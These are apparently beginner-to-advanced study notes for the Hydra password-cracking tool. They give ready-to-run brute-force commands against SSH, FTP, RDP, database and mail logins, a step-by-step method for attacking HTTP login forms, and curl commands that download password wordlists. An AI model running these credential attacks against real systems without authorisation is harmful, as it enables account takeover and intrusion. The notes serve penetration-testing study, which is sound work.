#  Hydra Complete Notes (Beginner → Advanced)

---

#  1. Introduction

Hydra is a fast password-cracking tool used for **brute-force attacks** on services like SSH, FTP, HTTP, RDP, etc.

---

#  2. Basic Syntax

hydra [OPTIONS] TARGET SERVICE


### Example:

                  hydra -l admin -P passwords.txt ssh://192.168.1.100


---

#  3. Important Options

| Option | Meaning            | Example          |
| ------ | ------------------ | ---------------- |
| `-l`   | Single username    | `-l admin`       |
| `-L`   | Username list      | `-L users.txt`   |
| `-p`   | Single password    | `-p 1234`        |
| `-P`   | Password list      | `-P rockyou.txt` |
| `-t`   | Threads (speed)    | `-t 4`           |
| `-f`   | Stop after success | `-f`             |
| `-s`   | Custom port        | `-s 2222`        |
| `-v`   | Verbose            | `-v`             |
| `-V`   | Very verbose       | `-V`             |

---

#  4. Hydra Services Table

| Hydra Service             | Protocol                         | Description (Simple)       | Example Command                                                                                             |
| ------------------------- | -------------------------------- | -------------------------- | ----------------------------------------------------------------------------------------------------------- |
| ftp                       | File Transfer Protocol           | Attack FTP login           | `hydra -l admin -P passwords.txt ftp://192.168.1.100`                                                       |
| ssh                       | Secure Shell                     | Attack remote login        | `hydra -l root -P passwords.txt ssh://192.168.1.100`                                                        |
| http-get / http-post-form | HTTP Web                         | Attack website login forms | `hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp                      | Simple Mail Transfer Protocol    | Attack mail sending login  | `hydra -l admin -P passwords.txt smtp://192.168.1.100`                                                      |
| pop3                      | Post Office Protocol             | Attack email inbox login   | `hydra -l user -P passwords.txt pop3://192.168.1.100`                                                       |
| imap                      | Internet Message Access Protocol | Access email remotely      | `hydra -l user -P passwords.txt imap://192.168.1.100`                                                       |
| mysql                     | MySQL Database                   | Attack database login      | `hydra -l root -P passwords.txt mysql://192.168.1.100`                                                      |
| mssql                     | Microsoft SQL Server             | Attack MS SQL database     | `hydra -l sa -P passwords.txt mssql://192.168.1.100`                                                        |
| vnc                       | Virtual Network Computing        | Remote desktop access      | `hydra -P passwords.txt vnc://192.168.1.100`                                                                |
| rdp                       | Remote Desktop Protocol          | Windows remote login       | `hydra -l admin -P passwords.txt rdp://192.168.1.100`                                                       |

---

# 5. Basic Attack Examples

## 🔹 SSH

                  hydra -l root -P passwords.txt ssh://192.168.1.100


## 🔹 FTP

                  hydra -l admin -P passwords.txt ftp://192.168.1.100


## 🔹 HTTP Basic Auth

                  hydra -L users.txt -P passwords.txt example.com http-get


## 🔹 Custom Port

                  hydra -L users.txt -P passwords.txt -s 2121 ftp://192.168.1.100


---

#  6. Understanding Login Forms

<form action="/login" method="post">
  <input name="username">
  <input name="password">
</form>


POST /login
username=admin&password=1234


---

#  7. HTTP Login Form Attack


            hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"


---

#  8. Params String Breakdown

```
"/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

* Path → `/login`
* Parameters → `username=^USER^&password=^PASS^`
* Condition → `F=Invalid credentials`

---

#  9. How to Find Required Values

* Open target → `http://IP:PORT`
* Inspect (F12) → find input names
* Network tab → capture request
* Identify:

  * Method (POST/GET)
  * Parameters
  * Error message

---

#  10. Attack Type Logic

| Method      | Use              |
| ----------- | ---------------- |
| POST        | `http-post-form` |
| GET         | `http-get-form`  |
| Popup login | `http-get`       |

 Rule: If POST → use `http-post-form`

---

#  11. Port Logic (-s)

| Case             | Action        |
| ---------------- | ------------- |
| `http://IP:5000` | Use `-s 5000` |
| `http://IP`      | No `-s`       |

---

#  12. F= vs S= Logic

### Use F=

```
F=Invalid credentials
```

### Use S=

```
S=302
S=Dashboard
```

---

#  13. Full Workflow

1. Open target
2. Inspect form
3. Find path & parameters
4. Capture request
5. Identify method
6. Choose F or S
7. Run Hydra
8. Get credentials

---

#  14. Download Wordlists

```bash
curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

---

#  15. Common Mistakes

* Wrong path
* Wrong parameters
* Ignoring port
* Wrong attack type
* Missing F/S

---

#  16. Quick Revision

                  hydra -L users.txt -P pass.txt IP http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"


> METHOD → PORT → RESPONSE → HYDRA COMMAND

---
